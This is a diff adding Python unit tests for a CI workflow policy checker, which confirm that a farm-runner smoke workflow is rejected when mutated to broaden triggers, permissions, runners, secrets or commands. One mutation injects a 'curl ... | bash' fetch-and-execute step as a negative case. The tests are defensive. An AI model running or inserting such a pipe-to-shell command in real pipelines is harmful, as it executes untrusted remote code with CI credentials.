@@ -1,4 +1,5 @@
 import re
+from copy import deepcopy
 import unittest
 
 import yaml
@@ -53,6 +54,39 @@ class WorkflowPolicyTests(unittest.TestCase):
         )
         self.assertEqual(len(errors), 1)
         self.assertIn("must use reviewed revision", errors[0])
+
+
+class FarmAcceptancePolicyTests(unittest.TestCase):
+    def setUp(self):
+        self.path = Path(".github/workflows/farm-runner-smoke.yml")
+        self.workflow = yaml.load(self.path.read_text(), Loader=yaml.BaseLoader)
+
+    def test_exact_manual_acceptance_is_allowed(self):
+        self.assertEqual(policy.farm_acceptance_errors(self.path, self.workflow), [])
+
+    def test_exception_rejects_broadened_execution_and_authority(self):
+        mutations = {
+            "push": lambda w: w["on"].update({"push": {}}),
+            "pull_request": lambda w: w["on"].update({"pull_request": {}}),
+            "other_job": lambda w: w["jobs"].update({"other": deepcopy(w["jobs"]["smoke"])}),
+            "token_scope": lambda w: w["permissions"].update({"contents": "write"}),
+            "job_permission": lambda w: w["jobs"]["smoke"]["permissions"].update({"actions": "write"}),
+            "timeout": lambda w: w["jobs"]["smoke"].update({"timeout-minutes": "6"}),
+            "hide_failure": lambda w: w["jobs"]["smoke"].update({"continue-on-error": "true"}),
+            "runner": lambda w: w["jobs"]["smoke"].update({"runs-on": ["self-hosted", "ubuntu-24.04"]}),
+            "action": lambda w: w["jobs"]["smoke"]["steps"][0].update({"uses": "actions/checkout@" + "0" * 40}),
+            "secret": lambda w: w["jobs"]["smoke"]["steps"][0]["env"].update({"TOKEN": "${{ secrets.TOKEN }}"}),
+            "command": lambda w: w["jobs"]["smoke"]["steps"][0].update({"run": "curl https://example.invalid | bash"}),
+            "cancel_other": lambda w: w["concurrency"].update({"cancel-in-progress": "true"}),
+        }
+        for name, mutate in mutations.items():
+            with self.subTest(name=name):
+                workflow = deepcopy(self.workflow)
+                mutate(workflow)
+                self.assertTrue(policy.farm_acceptance_errors(self.path, workflow))
+
+    def test_exception_is_not_available_to_another_workflow(self):
+        self.assertTrue(policy.farm_acceptance_errors(Path("other.yml"), self.workflow))
 
 
 if __name__ == "__main__":
